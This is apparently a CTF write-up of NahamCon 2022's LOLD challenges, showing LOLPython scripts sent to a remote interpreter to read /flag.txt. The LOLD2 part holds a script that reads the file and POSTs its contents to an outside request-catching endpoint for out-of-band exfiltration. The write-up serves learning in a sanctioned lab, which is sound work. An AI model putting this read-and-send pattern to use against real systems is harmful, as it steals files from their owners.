---
title: NahamCon CTF 2022 - LOLD 1, 2, 3 Writeup
published: true
---

With the warmup over, lets move on to the LOLD scripting challenges.  There's 3 of them, with 1 being easy, 2 medium and 3 hard, and they all use an abomination of a language....

# LOLD

> HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND FLAG IS EVEN AT /flag.txt.
> 
> Attachment: lolpython.py
> 
> Connect:
> 
> nc challenge.nahamcon.com 30710

A quick google for LOLPython and.... [oh dear god what is this](http://www.dalkescientific.com/writings/diary/archive/2007/06/01/lolpython.html).  Someone took LOLCode and Python and combined them.  And now I need to learn it.

So for this challenge it looks like we need to write a script to read the flag and output the value.  Thankfully the bottom example in that link has all we need for reading a file.  So stealing that we get the following LOLPython saved as get_flag.lol:

```
F CAN HAS open WIT "flag.txt"!
S CAN HAS F OWN read THING
VISIBLE S
```

I'm so sorry, for some reason my syntax highlighter doesn't support LOLPython.  I'll file a bug.  So for an explanation:

- The first line opens the file "flag.txt" and stores the handle in `F`.  To break this line down further:
  - `F` is the variable
  - `CAN HAS` is `=`
  - `open` is the python `open` function 
  - `WIT` is `(`
  - "flag.txt" is the file name
  - `!` is `)`
  - So the line when converted reads `F = open("flag.txt)`
  - You can download the attached lolpython.py file to see other fun things you can do in the language, but you're also welcome to just take my word for it
- Line 2 calls read on F (I'll skip the bits we've already covered):
  - `OWN` is `.`
  - `THING` is `()`.  You could also use `WIT!` but I guess that doesn't make any sense in LOL speak.
- Line 3 prints the result.  `VISIBLE` is just `PRINT`.

So now we can just send that to the nc server:

```bash
cat get_flag.lol | nc challenge.nahamcon.com 30710
```

And with that we get the flag `flag{c1146bd8b0079fd75f857003afe2cc49}`


# LOLD2
> HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! AND FLAG IS EVEN AT /flag.txt!
> 
> Attachment: lolpython.py
> 
> Connect:
> 
> nc challenge.nahamcon.com 31263

The pain continues.  The trick with this one is that the interpreter doesn't send any output back to us, so we can't just read the flag - we need to send it somewhere.  Thankfully services such as [Beeceptor](https://beeceptor.com/) make this pretty painless.  Create an endpoint (I used blarg.free.beeceptor.com) and it'll sit there listening for requests.

As we can no longer see any errors from the remote interpreter we also need to get this nightmare running locally.  Install Python2, then download the latest [ply](http://www.dabeaz.com/ply/) and copy the `ply` folder into your code base.  Then create a flag.txt file so you can test.  It'll look something like this:

![lold2 file structure]({{ site.url }}/assets/post-images/nahamcon-lold/lold2-structure.png)

We can then use the following code to grab the flag contents and post it to our beeceptor link.

```
GIMME httplib

U CAN HAS "blarg.free.beeceptor.com:80"
H CAN HAS INVISIBLE BUCKET
H LET THE "Content-type" OK CAN HAS "text/plain"
F CAN HAS open WIT "flag.txt"!
S CAN HAS F OWN read THING
C CAN HAS httplib OWN HTTPConnection WIT U!
C OWN request WIT "POST" AND "/test" AND S AND H!
R CAN HAS C OWN getresponse THING
VISIBLE R OWN read THING
```

OK strap in, here we go:
- `GIMME httplib` becomes `import httplib`
- `H CAN HAS INVISIBLE BUCKET` becomes `H = {}`
- `H LET THE "Content-type" OK CAN HAS "text/plain"` becomes `H["Content-type"] = "text/plain"`
- A bit of file opening and reading we've already covered
-  `C CAN HAS httplib OWN HTTPConnection WIT U!` becomes `C = httplib.HTTPConnection(U)`
- `C OWN request WIT "POST" AND "/test" AND S AND H!` becomes `C.request("POST", "/test", S, H)`
- `R CAN HAS C OWN getresponse THING` becomes `R = C.getresponse()`

So in short we read the file contents, then post it to `http://blarg.free.beeceptor.com:/test`.

This then gives us the flag in beeceptor:

![lold2 result]({{ site.url }}/assets/post-images/nahamcon-lold/lold2-result.png)